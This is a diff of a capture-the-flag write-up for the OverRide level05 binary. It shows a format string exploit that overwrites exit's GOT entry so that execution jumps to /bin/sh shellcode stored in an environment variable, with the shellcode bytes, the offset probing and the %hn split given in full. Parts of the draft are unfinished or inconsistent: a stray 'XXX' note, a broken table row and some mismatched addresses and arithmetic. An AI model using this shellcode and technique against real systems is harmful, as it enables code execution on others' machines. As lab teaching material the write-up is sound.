@@ -41,61 +41,42 @@ By looking at the execution result of the program, two things can be observed,
 - the uppercase letters will be turned into lower case letters
 - if the length of input is too long, the output will only print 99 characters
 
-By looking at the decompiled source (or with GDB), the function uses `printf`, so there is a chance for using format string attack.
+By looking at the decompiled source (or with GDB), the program uses `printf`, so there is a chance of us using a format string attack.
 
 ```
 gdb-peda$ info functions
-All defined functions:
-
-Non-debugging symbols:
-0x080482f8  _init
+[...]
 0x08048340  printf
 0x08048340  printf@plt
 0x08048350  fgets
 0x08048350  fgets@plt
-0x08048360  __gmon_start__
-0x08048360  __gmon_start__@plt
+[...]
 0x08048370  exit
 0x08048370  exit@plt
-0x08048380  __libc_start_main
-0x08048380  __libc_start_main@plt
-0x08048390  _start
-0x080483c0  __do_global_dtors_aux
-0x08048420  frame_dummy
-0x08048444  main
-0x08048520  __libc_csu_init
-0x08048590  __libc_csu_fini
-0x08048592  __i686.get_pc_thunk.bx
-0x080485a0  __do_global_ctors_aux
-0x080485cc  _fini
+[...]
 ```
 
-In above, the call for `exit()` is used, and we can overrite the exit() in the GOT(Global Offset Table) section.
-
-To find the GOT address of exit, the following command needs to be proceed:
+`exit` is also called, and we can overrite the exit() in the GOT section (Global Offset Table). Let's find the GOT address of `exit`:
 
 ```
 level05@OverRide:~$ objdump -R level05 | grep exit
 080497e0 R_386_JUMP_SLOT   exit
-level05@OverRide:~$
 ```
 
-We now have an address for exit, `0x080497e0`, we need to provide a payload that overwrites a shellcode.
+We now have an address for `exit` (`0x080497e0`), and we need to provide a payload that contains a shellcode.
 
 ```
-# a shellcode
+# our shellcode
 \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
 
 # store create payload that stores shellcode
-
-export PAYLOAD=$(python -c "print '\x90' * 1000 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'")
-
+export PAYLOAD=$(python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'")
 ```
 
-With the shellcode stored into the environment variable, a program can be writeen to access the address of the shellcode
+With the shellcode stored into the environment variable, a program can be written to access the address of the shellcode.
 
 ```
-# /tmp/getenv.c
+level05@OverRide:~$ cat /tmp/getenv.c
 #include <stdio.h>
 #include <stdlib.h>
 
@@ -104,21 +85,58 @@ int main(int argc, char *argv[])
 	printf("env address: %p\n", getenv(argv[1]));
 	return (0);
 }
-[...]
-level05@OverRide:/tmp$ gcc -m32 getenv.c -o getenv  # for 32bit
+level05@OverRide:~$ gcc -m32 /tmp/getenv.c -o /tmp/getenv  # NOTE: for 32bit
+level05@OverRide:~$ export PAYLOAD=$(python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'")
 level05@OverRide:/tmp$ ./getenv PAYLOAD
-env address: 0x7fffffffebbd
-
+env address: 0xffffdf9f                                    # NOTE: will change per machine
 ### remember, the env. variable will change of the execution point, so let's run the program on different location ###
 level05@OverRide:~$ /tmp/getenv PAYLOAD
 0xffffdefd
 ```
 
-We now have address we want(=`exit()`) to overwrite: `0x080497e0`, with the address of the stack `0xffffdefd`
+We now have address we want to overwrite (`exit`: `0x080497e0`) and the data we want to write (`PAYLOAD`: `0xffffdefd`).
+
+Unfortunately, `0xffffdefd` is quite large in decimal (`4294959007`), and it doesn't make sense to print that many characters in order to write the correct value with `printf`'s `%n` functionality. (Theoretically it would take approximately 7 minutes, but we'll count that as too long for our purposes.)
+
+Instead, we'll write the number as two separate `printf` `%n` exploits by splitting the number into two `short`s instead of an `int`. Our exploit will be in the following format:
+
+```
+AAAABBBB                        %n                                   %n
+    ^ Points to second short    ^ After [first short value] bytes    ^ After [second short value] bytes
+^ Points to first short           Takes AAAA as "param"          Takes BBBB as "param"
+```
+
+XXX: ntoe use of `%57077u%10$hn`
+
+Here's the process for splitting the `int` into two `short`s:
+
+| Step                        | First `short`          | Second `short`                                                                          |
+|-----------------------------|------------------------|-----------------------------------------------------------------------------------------|
+| Breaking the number down    | `0xffffdf9f`<br>`^^^^` | `0xffffdf9f`<br>`------^^^^`                                                            |
+| `short` value to write      | `0xffff`               | `0xdf9f`                                                                                |
+| Flip endian-ness            | `                      |                                                                                         |
+| Where we'll write to        | `0x080497e0`           | `0x080497e0` + 2 bytes = `0x080497e2`<br>We add 2 bytes because it's the second `short` |
+| Argument offset (see below) | 10                     | 11                                                                                      |
+
+
+
+
+We need to find where in memory our string is being stored in order to pass in our own input as "arguments" into `printf`. Let's find out the offset we need to pass into `printf`.
+
+```
+level05@OverRide:~$ echo "AAAABBBB %x %x %x %x %x %x %x %x %x %x %x %x" | ./level05
+aaaabbbb 64 f7fcfac0 f7ec3af9 ffffd6ef ffffd6ee 0 ffffffff ffffd774 f7fdb000 61616161 62626262 20782520
+```
+
+So our two offsets are 10 and 11.
+
+
+
+
 
 Because the address too big, we overwrite the target 2 bytes each time. (the first 4 bytes of address can be ignored)
 
-for the first 2 bytes, we input the data `0xdefd - 0x8 = 0xebb5(57077)` (because what the payload will prit out is 8 bytes=> XXXX that creates the offset of the printf already, and each address is 4 bytes XXXXXXX), then we overwrite the next two bytes `0xffff - 0xdefd = 0x2102 (8450)`
+for the first 2 bytes, we input the data `0xdefd - 0x8 = 0xebb5 (57077)` (because what the payload will prit out is 8 bytes=> XXXX that creates the offset of the printf already, and each address is 4 bytes XXXXXXX), then we overwrite the next two bytes `0xffff - 0xdefd = 0x2102 (8450)`
 
 let's try out
 
